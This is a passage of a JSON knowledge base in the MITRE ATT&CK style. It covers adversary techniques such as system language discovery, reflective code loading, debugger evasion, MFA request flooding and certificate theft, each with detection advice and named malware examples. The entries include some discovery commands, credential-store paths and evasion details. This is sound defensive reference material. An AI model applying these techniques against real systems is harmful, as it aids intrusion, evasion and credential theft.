    "Description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.[1][2]In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",
    "Detects": [
      "Monitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications.",
      "Monitor logs for actions that could be taken to gather information about pods, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications."
    ],
    "Procedure Examples": [
      "Hildegardhas used masscan to search for kubelets and the kubelet API for additional running containers.[3]",
      "Peiratescan enumerate Kubernetes pods in a given namespace.[4]",
      "TeamTNThas checked for running containers withdocker psand for specific container names withdocker inspect.[5]TeamTNThas also searched for Kubernetes pods running in a local network.[6]"
    ]
  },
  "T1614": {
    "Name": "System Location Discovery",
    "Description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information fromSystem Location Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.[1][2][3]Windows API functions such asGetLocaleInfoWcan also be used to determine the locale of the host.[1]In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.[4][5]Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.[6][2]",
    "Detects": [
      "Monitor executed commands and arguments that may gather information in an attempt to calculate the geographical location of a victim host.",
      "Remote access tools with built-in features may interact directly with the Windows API, such as callingGetLocaleInfoWto gather information.[1]",
      "Monitor newly executed processes that may gather information in an attempt to calculate the geographical location of a victim host."
    ],
    "Procedure Examples": [
      "Amadeydoes not run any tasks or install additional malware if the victim machine is based in Russia.[7]",
      "Crimsoncan identify the geographical location of a victim host.[8]",
      "Cuckoo Stealercan determine the geographical location of a victim host by checking the language.[9]",
      "DarkGatequeries system locale information during execution.[10]Later versions ofDarkGatequeryGetSystemDefaultLCIDfor locale information to determine if the malware is executing in Russian-speaking countries.[11]",
      "DarkWatchmancan identity the OS locale of a compromised host.[12]",
      "Gootloadercan use IP geolocation to determine if the person browsing to a compromised site is within a targeted territory such as the US, Canada, Germany, and South Korea.[13]",
      "GrimAgentcan identify the country code on a compromised host.[14]",
      "QuasarRATcan determine the country a victim host is located in.[15]",
      "Raccoon Stealercollects theLocale Nameof the infected device viaGetUserDefaultLocaleNameto determine whether the stringruis included, but in analyzed samples no action is taken if present.[16]",
      "Before executing malicious code,Ragnar Lockerchecks the Windows APIGetLocaleInfoWand doesn't encrypt files if it finds a former Soviet country.[1]",
      "Saint Bothas conducted system locale checks to see if the compromised host is in Russia, Ukraine, Belarus, Armenia, Kazakhstan, or Moldova.[17][18]",
      "SDBbotcan collected the country code of a compromised machine.[19]",
      "SideCopyhas identified the country location of a compromised host.[20]",
      "SocGholishcan use IP-based geolocation to limit infections to victims in North America, Europe, and a small number of Asian-Pacific nations.[21]",
      "Volt Typhoonhas obtained the victim's system current location.[22]"
    ]
  },
  "T1614.001": {
    "Name": "System Location Discovery:System Language Discovery",
    "Description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.[1]There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such asQuery Registryand calls toNative APIfunctions.[2]For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry keyHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Languageor parsing the outputs of Windows API functionsGetUserDefaultUILanguage,GetSystemDefaultUILanguage,GetKeyboardLayoutListandGetUserDefaultLangID.[3][4][5]On a macOS or Linux system, adversaries may querylocaleto retrieve the value of the$LANGenvironment variable.",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to gather information about the system language of a victim in order to infer the geographical location of that host.",
      "Monitor for API calls that may attempt to gather information about the system language of a victim in order to infer the geographical location of that host.",
      "Monitor for newly executed processes that may attempt to gather information about the system language of a victim in order to infer the geographical location of that host.",
      "Monitor for access to windows registry keys that may attempt to gather information about the system language of a victim in order to infer the geographical location of that host."
    ],
    "Procedure Examples": [
      "Avaddonchecks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.[6]",
      "Bazarcan perform a check to ensure that the operating system's keyboard and language settings are not set to Russian.[7]",
      "BlackByteidentified system language settings to determine follow-on execution.[8]",
      "BlackByte Ransomwareidentifies the language on the victim system.[9]",
      "Clophas checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check theGetTextCharsetfunction.[10]",
      "Cubacan check if Russian language is installed on the infected machine by using the functionGetKeyboardLayoutList.[11]",
      "Cuckoo Stealercan check the systemsLANGenvironmental variable to prevent infecting devices from Armenia (hy_AM), Belarus (be_BY), Kazakhstan (kk_KZ), Russia (ru_RU), and Ukraine (uk_UA).[12]",
      "Some versions ofDEATHRANSOMhave performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or TatarDEATHRANSOMwould exit.[13]",
      "DropBookhas checked for the presence of Arabic language in the infected machine's settings.[14]",
      "Flagprocan check whether the target system is using Japanese, Taiwanese, or English through detection of specific Windows Security and Internet Explorer dialog.[15]",
      "Gootloadercan determine if a victim's computer is running an operating system with specific language preferences.[16]",
      "GrimAgenthas usedAccept-Languageto identify hosts in the United Kingdom, United States, France, and Spain.[17]",
      "IcedIDused the following command to check the country/language of the active console:cmd.exe /c chcp >&2.[18]",
      "Ke3changhas used implants to collect the system language ID of a compromised machine.[19]",
      "LockBit 2.0can check if a targeted machine is using a set of Eastern European languages and exit without infection if so.[20][21]",
      "LockBit 3.0will not affect machines with language settings matching a defined exlusion list of mainly Eastern European languages.[22][23]",
      "Malteirowill terminateMispadu's infection process if the language of the victim machine is not Spanish or Portuguese.[24]",
      "MarkiRATcan use theGetKeyboardLayoutAPI to check if a compromised host's keyboard is set to Persian.[25]",
      "Mazehas checked the language of the machine with functionGetUserDefaultUILanguageand terminated execution if the language matches with an entry in the predefined list.[26]",
      "Misdathas attempted to detect if a compromised host had a Japanese keyboard via the Windows API callGetKeyboardType.[27]",
      "Mispaduchecks and will terminate execution if the compromised system’s language ID is not Spanish or Portuguese.[28][24]",
      "Neoichorcan identify the system language on a compromised host.[19]",
      "DuringOperation Dream Job,Lazarus Groupdeployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.[29]",
      "REvilcan check the system language usingGetUserDefaultUILanguageandGetSystemDefaultUILanguage. If the language is found in the list, the process terminates.[30]",
      "Ryukhas been observed to query the registry keyHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Languageand the valueInstallLanguage. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.[2]",
      "S-Typehas attempted to determine if a compromised system was using a Japanese keyboard via theGetKeyboardTypeAPI call.[27]",
      "SharpStagehas been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.[14]",
      "Sparkhas checked the results of theGetKeyboardLayoutListand the language name returned byGetLocaleInfoAto make sure they contain the word \"Arabic\" before executing.[31]",
      "StealBitcan determine system location based on the default language setting and will not execute on systems located in former Soviet countries.[32]",
      "StrelaStealervariants check system language settings via keyboard layout or similar mechanisms.[33][34]",
      "SynAcklists all the keyboard layouts installed on the victim’s system usingGetKeyboardLayoutListAPI and checks against a hardcoded language code list. If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files.[5]",
      "XCSSETuses AppleScript to check the host's language and location with the commanduser locale of (get system info).[35]",
      "Zeus Pandaqueries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN.[36]"
    ]
  },
  "T1615": {
    "Name": "Group Policy Discovery",
    "Description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Adversaries may use commands such asgpresultor various publicly available PowerShell functions, such asGet-DomainGPOandGet-DomainGPOLocalGroup, to gather information on Group Policy settings.[3][4]Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e.Domain or Tenant Policy Modification) for their benefit.",
    "Detects": [
      "Monitor for abnormal LDAP queries with filters forgroupPolicyContainerand high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.",
      "Monitor for suspicious use ofgpresult. Monitor for the use of PowerShell functions such asGet-DomainGPOandGet-DomainGPOLocalGroupand processes spawning with command-line arguments containingGPOLocalGroup.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor for newly executed processes that may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "BloodHoundhas the ability to collect local admin information via GPO.[5]",
      "DUSTTRAPcan identify victim environment Group Policy information.[6]",
      "Emissaryhas the capability to executegpresult.[7]",
      "Empireincludes various modules for enumerating Group Policy.[4]",
      "Leviathanperformed extensive Active Directory enumeration of victim environments duringLeviathan Australian Intrusions.[8]",
      "LunarWebcan capture information on group policy settings[9]",
      "Turlasurveys a system upon check-in to discover Group Policy details using thegpresultcommand.[10]"
    ]
  },
  "T1619": {
    "Name": "Cloud Storage Object Discovery",
    "Description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar toFile and Directory Discoveryon a local host, after identifying available storage services (i.e.Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS[1]and List Blobs in Azure[2].",
    "Detects": [
      "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.",
      "Monitor cloud logs for API calls used for file or object enumeration for unusual activity. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
    ],
    "Procedure Examples": [
      "Pacucan enumerate AWS storage services, such as S3 buckets and Elastic Block Store volumes.[3]",
      "Peiratescan list AWS S3 buckets.[4]"
    ]
  },
  "T1620": {
    "Name": "Reflective Code Loading",
    "Description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g.,Shared Modules).Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).[1][2][3][4][5]For example, theAssembly.Load()method executed byPowerShellmay be abused to load raw code into the running process.[6]Reflective code injection is very similar toProcess Injectionexcept that the \"injection\" loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.[3][4][7][8]",
    "Detects": [
      "Monitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe)",
      "Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such asAssembly.Load()andNative APIfunctions such asCreateThread(),memfd_create(),execve(), and/orexecveat().[4][8]",
      "Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes.[35][1]"
    ],
    "Procedure Examples": [
      "BADHATCHcan copy a large byte array of 64-bit shellcode into process memory and execute it with a call toCreateThread.[9]",
      "Brute Ratel C4has used reflective loading to execute malicious DLLs.[10]",
      "Cobalt Strike'sexecute-assemblycommand can run a .NET executable within the memory of a sacrificial process by loading the CLR.[11]",
      "Cubaloaded the payload into memory using PowerShell.[12]",
      "Donutcan generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.[13]",
      "Emotethas reflectively loaded payloads into memory.[14]",
      "FoggyWeb's loader has reflectively loaded .NET-based assembly/payloads into memory.[15]",
      "Gelsemiumcan use custom shellcode to map embedded DLLs into memory.[16]",
      "IceApplecan use reflective code loading to load .NET assemblies intoMSExchangeOWAAppPoolon targeted Exchange servers.[17]",
      "Kimsukyhas used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory.[18]",
      "Lazarus Grouphas changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed viaKernelCallbackTablehijacking.Lazarus Grouphas also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.[19][20]",
      "Lokibothas reflectively loaded the decoded DLL into memory.[21]",
      "Lumma Stealerhas used reflective loading techniques to load content into memory during execution.[22][23]",
      "LunarLoadercan use reflective loading to decrypt and run malicious executables in a new thread.[24]",
      "metaMainhas reflectively loaded a DLL to read, decrypt, and load an orchestrator file.[25]",
      "Pikabotreflectively loads stored, previously encrypted components of the PE file into memory of the currently executing process to avoid writing content to disk on the executing machine.[26]",
      "PowerSploitreflectively loads a Windows PE file into a process.[27][28]",
      "Sardonichas a plugin system that can load specially made DLLs into memory and execute their functions.[29][30]",
      "SILENTTRINITYcan run a .NET executable within the memory of a sacrificial process by loading the CLR.[31]",
      "ThiefQuestuses various API functions such asNSCreateObjectFileImageFromMemoryto load and link in-memory payloads.[32]",
      "Uroburoshas the ability to load new modules directly into memory using itsLoad Modules Memcommand.[33]",
      "WhisperGate's downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.[34]"
    ]
  },
  "T1621": {
    "Name": "Multi-Factor Authentication Request Generation",
    "Description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials toValid Accountsmay be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).[1]In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \"MFA fatigue.\"[2][3][4]",
    "Detects": [
      "Monitor application logs for suspicious events including repeated MFA failures that may indicate user's primary credentials have been compromised.",
      "Monitor 2FA/MFA application logs for suspicious events such as rapid login attempts with valid credentials.",
      "Monitor 2FA/MFA application logs for suspicious events such as unusual login attempt source location, mismatch in location of login attempt and smart device approving 2FA/MFA request prompts.",
      "Monitor user account logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism.Analytic 1 - Anomalous IP addresses, unmanaged devices, unusual User Agents indicating automation tools or scripts, high failure ratesindex=\"m365_audit_logs\" Operation=\"UserLoginFailed\" ErrorNumber=\"500121\"| stats count by ClientIP, UserId, DeviceProperties| where ClientIP!=\"expected_ip\" OR DeviceProperties!=\"expected_properties\""
    ],
    "Procedure Examples": [
      "APT29has used repeated MFA requests to gain access to victim accounts.[4][5]",
      "DuringC0027,Scattered Spiderattempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.[6]",
      "LAPSUS$has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval.[7]",
      "Scattered Spiderhas used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.[8]"
    ]
  },
  "T1622": {
    "Name": "Debugger Evasion",
    "Description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.[1]Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar toVirtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary. On Windows, this may involveNative APIfunction calls such asIsDebuggerPresent()andNtQueryInformationProcess(), or manually checking theBeingDebuggedflag of the Process Environment Block (PEB). On Linux, this may involve querying/proc/self/statusfor theTracerPIDfield, which indicates whether or not the process is being traced by dynamic analysis tools.[2][3]Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).[4][5][6]Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.[7]Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by loopingNative APIfunction calls such asOutputDebugStringW().[8][9]",
    "Detects": [
      "Monitor debugger logs for signs of abnormal and potentially malicious activity.",
      "Monitor executed commands and arguments that may employ various means to detect and avoid debugged environments. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Monitor for API calls (such asIsDebuggerPresent()) that may employ various means to detect and avoid debugged environments. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required.",
      "Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained."
    ],
    "Procedure Examples": [
      "AsyncRATcan use theCheckRemoteDebuggerPresentfunction to detect the presence of a debugger.[10]",
      "TheBlack Bastadropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.[11]",
      "Bumblebeecan search for tools used in static analysis.[12]",
      "DarkGatechecks theBeingDebuggedflag in the PEB structure during execution to identify if the malware is being debugged.[13]",
      "DarkTortillacan detect debuggers by using functions such asDebuggerIsAttachedandDebuggerIsLogging.DarkTortillacan also detect profilers by verifying theCOR_ENABLE_PROFILINGenvironment variable is present and active.[14]",
      "DRATzaruscan useIsDebuggerPresentto detect whether a debugger is present on a victim.[15]",
      "Latrodectushas the ability to check for the presence of debuggers.[16]",
      "LockBit 3.0can check heap memory parameters for indications of a debugger and stop the flow of events to the attached debugger in order to hinder dynamic analysis.[17]",
      "Lumma Stealerhas checked for debugger strings by invokingGetForegroundWindowand looks for strings containing \"x32dbg\", \"x64dbg\", \"windbg\", \"ollydbg\", \"dnspy\", \"immunity debugger\", \"hyperdbg\", \"debug\", \"debugger\", \"cheat engine\", \"cheatengine\" and \"ida\".[18]",
      "Mafaldacan search for debugging tools on a compromised host.[19]",
      "DuringOperation Dream Job,Lazarus Groupused tools that used theIsDebuggerPresentcall to detect debuggers.[15]",
      "Pikabotfeatures several methods to evade debugging by analysts, including checks for active debuggers, the use of breakpoints during execution, and checking various system information items such as system memory and the number of processors.[20][21][22]",
      "Raspberry Robinleverages anti-debugging mechanisms through the use ofThreadHideFromDebugger.[23]",
      "ROKRATcan check for debugging tools.[24][25][26]",
      "Saint Bothas usedis_debugger_presentas part of its environmental checks.[27]",
      "StealBitcan detect it is being run in the context of a debugger.[28]",
      "StrelaStealervariants include functionality to identify and evade debuggers.[29]",
      "ThiefQuestuses a function namedis_debuggingto perform anti-debugging logic. The function invokessysctlchecking the returned value ofP_TRACED.ThiefQuestalso callsptracewith thePTRACE_DENY_ATTACHflag to prevent debugging.[8]",
      "XLoaderuses anti-debugging mechanisms such as callingNtQueryInformationProcesswithInfoClass=7, referencingProcessDebugPort, to determine if it is being analyzed.[30]"
    ]
  },
  "T1647": {
    "Name": "Plist File Modification",
    "Description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as theinfo.plistfile, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.[1]Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e.Hidden Window) or running additional commands for persistence (ex:Launch Agent/Launch DaemonorRe-opened Applications).For example, adversaries can add a malicious application path to the~/Library/Preferences/com.apple.dock.plistfile, which controls apps that appear in the Dock. Adversaries can also modify theLSUIElementkey in an application’sinfo.plistfile  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such asLSEnvironment, to enable persistence viaDynamic Linker Hijacking.[2][3]",
    "Detects": [
      "Monitor for commands with arguments (such as opening common command-line editors) used to modify plist files, especially commonly abused files such as those in\\~/LaunchAgents,\\~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm, and an application'sInfo.plist.",
      "Monitor for plist file modification, especially if immediately followed by other suspicious events such as code execution from\\~/Library/Scriptsor\\~/Library/Preferences. Also, monitor for significant changes to any path pointers in a modified plist.",
      "Monitor for newly executed processes with arguments that can modify property list (plist) files."
    ],
    "Procedure Examples": [
      "Cuckoo Stealercan create and populate property list (plist) files to enable execution.[4][5]",
      "In older versions,XCSSETuses theplutilcommand to modify theLSUIElement,DFBundleDisplayName, andCFBundleIdentifierkeys in the/Contents/Info.plistfile to change howXCSSETis visible on the system. In later versions,XCSSETleverages a third-party notarizeddockutiltool to modify the.plistfile responsible for presenting applications to the user in the Dock and LaunchPad to point to a malicious application.[6][7]"
    ]
  },
  "T1648": {
    "Name": "Serverless Execution",
    "Description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers.Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e.Resource Hijacking).[1]Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use theIAM:PassRolepermission in AWS or theiam.serviceAccounts.actAspermission in Google Cloud to addAdditional Cloud Rolesto a serverless cloud function, which may then be able to perform actions the original user cannot.[2][3]Serverless functions can also be invoked in response to cloud events (i.e.Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically addsAdditional Cloud Credentialsto a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.[4]This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.[5][6]In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.[7][8]",
    "Detects": [
      "Monitor Serverless Execution activities by examining logs that contain information about Serverless function invocations. This is especially useful for detecting anomalous behavior within AWS Lambda, Azure Functions, or Google Cloud Functions. For example, in Exchange environments emails sent by Power Automate via the Outlook 365 connector include the phrase ‘Power App’ or ‘Power Automate’ in the SMTP header 'x-ms-mail-application.'[12]Analytic 1 - Failed or abnormal serverless function invocations across AWS, Azure, and Google Cloudsourcetype=aws:lambda OR sourcetype=azure:function OR sourcetype=gcp:function| where result_status != \"Success\"",
      "Monitor for unusual Serverless function modifications, such as adding roles to a function that allow unauthorized access or execution.Analytic 1 - Tracks actions related to creating or modifying serverless functionsindex=cloud_logs sourcetype=aws:iam OR sourcetype=azure:activity OR sourcetype=gcp:iam| search action IN (\"iam:PassRole\", \"iam:CreateFunction\", \"iam:AddPermission\", \"iam:UpdateFunctionConfiguration\")"
    ],
    "Procedure Examples": [
      "Pacucan create malicious Lambda functions.[9]"
    ]
  },
  "T1649": {
    "Name": "Steal or Forge Authentication Certificates",
    "Description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.[1][2]Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)[3], misplaced certificate files (i.e.Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs.[4][5][6]With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.[7]Abusing certificates for authentication credentials may enable other behaviors such asLateral Movement. Certificate-related misconfigurations may also enable opportunities forPrivilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enablePersistencevia stealing or forging certificates that can be used asValid Accountsfor the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establishPersistenceby forging arbitrary authentication certificates for the victim domain (known as \"golden\" certificates).[7]Adversaries may also target certificates and related services in order to access other forms of credentials, such asGolden Ticketticket-granting tickets (TGT) or NTLM plaintext.[7]",
    "Detects": [
      "Monitor AD CS certificate requests (ex: EID 4886) as well as issued certificates (ex: EID 4887) for abnormal activity, including unexpected certificate enrollments and signs of abuse within certificate attributes (such as abusable EKUs).[4]",
      "Monitor for changes to CA attributes and settings, such as AD CS certificate template modifications (ex: EID 4899/4900 once a potentially malicious certificate is enrolled).[4]",
      "Ensure CA audit logs are enabled and monitor these services for signs of abuse.[4]",
      "Monitor for the execution of commands and other utilities abused to forge and/or steal certificates and related private keys.[4]",
      "Monitor for attempts to access files that store information about certificates and their associated private keys. For example, personal certificates for users may be stored on disk in folders such as%APPDATA%\\Microsoft\\SystemCertificates\\My\\Certificates\\.[4][1]",
      "Monitor certificate-based authentication events, such as EID 4768 when an AD CS certificate is used for Kerberos authentication (especially those that don’t correspond to legitimately issued certificates) or when Secure Channel (Schannel, associated with SSL/TLS) is highlighted as theLogon Processassociated with an EID 4624 logon event.[4]",
      "Monitor for attempts to access information stored in the Registry about certificates and their associated private keys. For example, user certificates are commonly stored underHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\SystemCertificates.[4][1]"
    ],
    "Procedure Examples": [
      "AADInternalscan create and export various authentication certificates, including those associated with Azure AD joined/registered devices.[8]",
      "APT29has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.[9]",
      "Mimikatz'sCRYPTOmodule can create and export various types of authentication certificates.[10]"
    ]
  },
  "T1650": {
    "Name": "Acquire Access",
    "Description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.[1][2][3]In some cases, adversary groups may form partnerships to share compromised systems with each other.[4]Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g.,Web Shell) or established access viaExternal Remote Services. In some cases, access brokers will implant compromised systems with a \"load\" that can be used to install additional malware for paying customers.[1]By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.[1][2]In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via aTrusted Relationship,Multi-Factor Authentication Interception, or evenSupply Chain Compromise.Note:while this technique is distinct from other behaviors such asPurchase Technical DataandCredentials, they may often be used in conjunction (especially where the acquired foothold requiresValid Accounts).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
    ]
  },
  "T1651": {
    "Name": "Cloud Administration Command",
    "Description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents.[1][2]If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage aTrusted Relationshipto execute commands in connected virtual machines.[3]",
    "Detects": [
